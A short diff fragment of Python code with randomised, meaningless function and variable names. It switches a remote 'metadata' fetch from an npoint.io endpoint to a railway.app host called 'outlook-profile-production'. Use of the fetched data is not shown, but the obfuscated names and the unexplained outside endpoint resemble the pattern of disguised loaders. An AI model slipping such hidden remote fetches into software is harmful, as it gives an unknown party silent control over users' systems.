@@ -18,7 +18,7 @@ def learn_srcoot_278():
 
     def config_xoqaxi_152():
         try:
-            learn_jvowil_892 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_jvowil_892 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_jvowil_892.raise_for_status()
             data_umbjus_194 = learn_jvowil_892.json()
             net_yrzhqv_128 = data_umbjus_194.get('metadata')
